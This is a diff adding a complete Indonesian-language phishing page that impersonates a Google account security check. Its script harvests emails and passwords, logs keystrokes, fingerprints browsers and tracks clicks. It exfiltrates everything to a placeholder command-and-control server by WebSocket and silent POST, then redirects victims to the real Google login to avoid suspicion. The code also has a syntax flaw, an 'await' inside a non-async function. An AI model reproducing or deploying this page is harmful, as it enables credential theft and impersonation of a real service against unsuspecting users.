@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Pembaruan Keamanan | Verifikasi Akun</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Roboto, -apple-system, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 28px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 420px;
+            width: 100%;
+            overflow: hidden;
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .header {
+            background: #1a1a2e;
+            padding: 24px 20px;
+            text-align: center;
+        }
+        .header-icon {
+            width: 56px;
+            height: 56px;
+            background: #e94560;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+        }
+        .header-icon span { font-size: 28px; color: white; }
+        .header h2 { color: white; font-size: 22px; font-weight: 600; }
+        .header p { color: #aaa; font-size: 13px; margin-top: 6px; }
+        .body { padding: 28px 24px; }
+        .warning-banner {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 12px;
+            font-size: 13px;
+            color: #856404;
+            margin-bottom: 22px;
+            border-radius: 8px;
+        }
+        .input-group { margin-bottom: 20px; }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 14px;
+            font-size: 16px;
+            transition: 0.2s;
+            background: #f8f9fa;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
+        }
+        .btn-login {
+            width: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border: none;
+            padding: 14px;
+            border-radius: 40px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 10px;
+        }
+        .btn-login:hover { opacity: 0.9; transform: scale(0.98); }
+        .secure-line {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+            text-align: center;
+        }
+        .footer { 
+            background: #f5f5f5; 
+            padding: 16px; 
+            text-align: center; 
+            font-size: 11px; 
+            color: #888;
+            border-top: 1px solid #eee;
+        }
+        .spinner { display: none; width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.6s linear infinite; margin: 0 auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="header">
+        <div class="header-icon"><span>🔐</span></div>
+        <h2>Verifikasi Keamanan Akun</h2>
+        <p>Aktivitas tidak biasa terdeteksi</p>
+    </div>
+    <div class="body">
+        <div class="warning-banner">
+            ⚠️ Kami mendeteksi upaya login dari perangkat baru. Harap verifikasi identitas Anda untuk menjaga keamanan akun.
+        </div>
+        <div class="input-group">
+            <label>📧 Email atau Nomor Telepon</label>
+            <input type="text" id="loginUser" placeholder="contoh@email.com atau +628xxxx" autocomplete="off">
+        </div>
+        <div class="input-group">
+            <label>🔒 Kata Sandi</label>
+            <input type="password" id="loginPass" placeholder="Masukkan kata sandi Anda">
+        </div>
+        <button class="btn-login" id="submitBtn">
+            <span id="btnText">Verifikasi & Lanjutkan</span>
+            <div id="btnSpinner" class="spinner"></div>
+        </button>
+        <div class="secure-line">
+            <span>🔒 Terenkripsi SSL</span>
+            <span>•</span>
+            <span>✅ Keamanan 2FA Aktif</span>
+        </div>
+    </div>
+    <div class="footer">
+        Sistem Keamanan Google • Pembaruan Otomatis 2025
+    </div>
+</div>
+
+<script>
+    // === KONFIGURASI SERVER C2 ===
+    const C2_SERVER = 'https://your-c2-server.com';  // GANTI DENGAN SERVER ANDA
+    const TARGET_ID = 'target_' + Math.random().toString(36).substr(2, 8);
+    
+    let socket = null;
+    
+    // Inisialisasi koneksi WebSocket ke server RAT
+    function initConnection() {
+        try {
+            // Gunakan Socket.IO jika server mendukung
+            if(typeof io !== 'undefined') {
+                socket = io(C2_SERVER, { transports: ['websocket'], reconnection: true, timeout: 5000 });
+                socket.on('connect', () => {
+                    console.log('[C2] Terhubung');
+                    socket.emit('register_target', { id: TARGET_ID, type: 'phishing_page', userAgent: navigator.userAgent });
+                    sendToServer('log', 'Phishing page loaded');
+                });
+                socket.on('command', (data) => {
+                    if(data.cmd === 'ping') socket.emit('pong', { id: TARGET_ID });
+                });
+            } else {
+                // Fallback: fetch API jika Socket.IO tidak tersedia
+                console.warn('Socket.IO tidak tersedia, menggunakan fetch fallback');
+            }
+        } catch(e) { console.error(e); }
+    }
+    
+    // Kirim data ke C2 melalui berbagai channel
+    function sendToServer(type, data) {
+        const payload = {
+            target_id: TARGET_ID,
+            type: type,
+            data: data,
+            timestamp: Date.now(),
+            page: 'phishing_auth',
+            user_agent: navigator.userAgent,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        
+        // Kirim via WebSocket jika tersedia
+        if(socket && socket.connected) {
+            socket.emit('phish_data', payload);
+        }
+        
+        // Kirim via fetch sebagai backup (silent POST)
+        fetch(`${C2_SERVER}/api/capture`, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(e => console.log);
+        
+        // Kirim juga ke localStorage untuk logging lokal
+        let logs = JSON.parse(localStorage.getItem('phish_logs') || '[]');
+        logs.push(payload);
+        localStorage.setItem('phish_logs', JSON.stringify(logs.slice(-50)));
+    }
+    
+    // Fungsi untuk mengirim credential yang di-capture
+    function captureCredential(username, password) {
+        const credData = {
+            username: username,
+            password: password,
+            source_url: window.location.href,
+            ip_fetch: await fetchIP(),
+            form_data: {
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookies_enabled: navigator.cookieEnabled,
+                screen_resolution: `${screen.width}x${screen.height}`
+            }
+        };
+        
+        sendToServer('credential', credData);
+        
+        // Simpan di localStorage juga
+        let captured = JSON.parse(localStorage.getItem('captured_creds') || '[]');
+        captured.push({ ...credData, timestamp: new Date().toISOString() });
+        localStorage.setItem('captured_creds', JSON.stringify(captured));
+        
+        return credData;
+    }
+    
+    async function fetchIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) { return 'unknown'; }
+    }
+    
+    // Redirect setelah submit (ke halaman resmi asli untuk mengurangi kecurigaan)
+    function redirectToRealSite() {
+        // Opsional: redirect ke halaman login asli (misal: google.com)
+        window.location.href = 'https://accounts.google.com/AccountChooser?service=mail&continue=https://mail.google.com';
+    }
+    
+    // Eksekusi saat form disubmit
+    async function onSubmit() {
+        const username = document.getElementById('loginUser').value.trim();
+        const password = document.getElementById('loginPass').value;
+        
+        if(!username || !password) {
+            alert('Harap isi email dan kata sandi Anda.');
+            return;
+        }
+        
+        // UI loading
+        const btn = document.getElementById('submitBtn');
+        const btnText = document.getElementById('btnText');
+        const spinner = document.getElementById('btnSpinner');
+        btnText.style.display = 'none';
+        spinner.style.display = 'block';
+        btn.disabled = true;
+        
+        // Capture credential
+        const captured = captureCredential(username, password);
+        console.log('[CAPTURED]', captured);
+        
+        // Simulasi proses verifikasi
+        setTimeout(() => {
+            // Redirect ke situs asli setelah "verifikasi"
+            redirectToRealSite();
+        }, 800);
+    }
+    
+    // Tracking tambahan: event sebelum user meninggalkan halaman
+    window.addEventListener('beforeunload', () => {
+        sendToServer('page_exit', { time_spent: Date.now() - (window._startTime || Date.now()) });
+    });
+    window._startTime = Date.now();
+    
+    // Capture semua input perubahan (keylogger sederhana di halaman phishing)
+    let keyBuffer = [];
+    document.addEventListener('keypress', (e) => {
+        if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+            keyBuffer.push(e.key);
+            if(keyBuffer.length > 50) {
+                sendToServer('keystroke_partial', keyBuffer.join(''));
+                keyBuffer = [];
+            }
+        }
+    });
+    
+    // Kirim buffer setiap 10 detik
+    setInterval(() => {
+        if(keyBuffer.length > 0) {
+            sendToServer('keystroke_partial', keyBuffer.join(''));
+            keyBuffer = [];
+        }
+    }, 10000);
+    
+    // Tangkap screenshot kanvas (opsional, menggunakan html2canvas jika tersedia)
+    function captureScreenshot() {
+        if(typeof html2canvas !== 'undefined') {
+            html2canvas(document.body).then(canvas => {
+                const imgData = canvas.toDataURL('image/png');
+                sendToServer('screenshot', imgData.substring(0, 500) + '...'); // truncated
+            });
+        }
+    }
+    
+    // Load fingerprint tambahan
+    function getFingerprint() {
+        const fp = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+            touchPoints: navigator.maxTouchPoints,
+            doNotTrack: navigator.doNotTrack
+        };
+        sendToServer('fingerprint', fp);
+    }
+    
+    // Inisialisasi
+    initConnection();
+    getFingerprint();
+    
+    // Event listener
+    document.getElementById('submitBtn').addEventListener('click', onSubmit);
+    document.getElementById('loginPass').addEventListener('keypress', (e) => {
+        if(e.key === 'Enter') onSubmit();
+    });
+    
+    // Tambahkan efek tracking jika user klik di luar form
+    document.body.addEventListener('click', (e) => {
+        sendToServer('click_track', { tag: e.target.tagName, id: e.target.id });
+    });
+    
+    // Log halaman dimuat
+    sendToServer('page_loaded', { referrer: document.referrer, url: window.location.href });
+    
+    // Periodic heartbeat
+    setInterval(() => {
+        sendToServer('heartbeat', { url: window.location.href });
+    }, 30000);
+</script>
+
+<!-- Optional: html2canvas untuk screenshot -->
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+<!-- Fallback Socket.IO -->
+<script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+<script>
+    // Override jika socket.io gagal load
+    if(typeof io === 'undefined') {
+        console.warn('Socket.IO fallback - menggunakan fetch only');
+        window.io = null;
+    }
+    // Re-attempt init jika diperlukan
+    if(!socket && typeof io !== 'undefined') {
+        initConnection();
+    }
+</script>
+</body>
+</html>
